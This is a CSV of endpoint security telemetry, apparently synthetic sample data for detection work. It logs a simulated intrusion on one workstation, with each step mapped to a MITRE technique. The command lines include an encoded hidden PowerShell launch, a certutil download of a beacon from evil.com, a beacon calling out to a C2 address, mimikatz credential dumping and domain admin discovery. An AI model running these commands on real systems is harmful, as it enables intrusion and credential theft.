Timestamp,Machine Id,Computer Name,Action Type,File Name,Folder Path,SHA256,Initiating Process File Name,Initiating Process Command Line,Initiating Process Parent File Name,Account Name,Account Domain,Remote IP,Remote Port,Local IP,Local Port,Protocol,Report Id,Categories
2025-03-15T10:00:01.000,abc123,WORKSTATION01.corp.local,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,e3b0c44298fc1c149afbf4c8996fb924,"powershell.exe","powershell.exe -nop -w hidden -encodedcommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",cmd.exe,jsmith,CORP,,,,,,1001,T1059.001 (mitre)
2025-03-15T10:00:15.000,abc123,WORKSTATION01.corp.local,ProcessCreated,certutil.exe,C:\Windows\System32,a1b2c3d4e5f6,"certutil.exe","certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\Users\Public\beacon.exe",powershell.exe,jsmith,CORP,,,,,,1002,T1105 (mitre)
2025-03-15T10:00:30.000,abc123,WORKSTATION01.corp.local,ConnectionSuccess,,,,,,,jsmith,CORP,185.220.101.45,443,10.0.0.100,49152,TCP,1003,T1071 (mitre)
2025-03-15T10:00:45.000,abc123,WORKSTATION01.corp.local,ConnectionSuccess,,,,,,,jsmith,CORP,185.220.101.45,443,10.0.0.100,49153,TCP,1004,T1071 (mitre)
2025-03-15T10:01:00.000,abc123,WORKSTATION01.corp.local,ConnectionSuccess,,,,,,,jsmith,CORP,185.220.101.45,443,10.0.0.100,49154,TCP,1005,T1071 (mitre)
2025-03-15T10:01:15.000,abc123,WORKSTATION01.corp.local,ProcessCreated,beacon.exe,C:\Users\Public,deadbeef,"beacon.exe","C:\Users\Public\beacon.exe --c2 185.220.101.45",certutil.exe,jsmith,CORP,,,,,,1006,T1059 (mitre)
2025-03-15T10:01:30.000,abc123,WORKSTATION01.corp.local,ProcessCreated,mimikatz.exe,C:\Users\Public,cafebabe,"mimikatz.exe","mimikatz.exe sekurlsa::logonpasswords",beacon.exe,jsmith,CORP,,,,,,1007,T1003 (mitre)
2025-03-15T10:01:45.000,abc123,WORKSTATION01.corp.local,ProcessCreated,cmd.exe,C:\Windows\System32,11111111,"cmd.exe","cmd.exe /c whoami /all",beacon.exe,jsmith,CORP,,,,,,1008,T1082 (mitre)
2025-03-15T10:02:00.000,abc123,WORKSTATION01.corp.local,ProcessCreated,cmd.exe,C:\Windows\System32,11111111,"cmd.exe","cmd.exe /c net user /domain",beacon.exe,jsmith,CORP,,,,,,1009,T1087 (mitre)
2025-03-15T10:02:15.000,abc123,WORKSTATION01.corp.local,ProcessCreated,cmd.exe,C:\Windows\System32,11111111,"cmd.exe","cmd.exe /c net group ""Domain Admins"" /domain",beacon.exe,jsmith,CORP,,,,,,1010,T1087.002 (mitre)
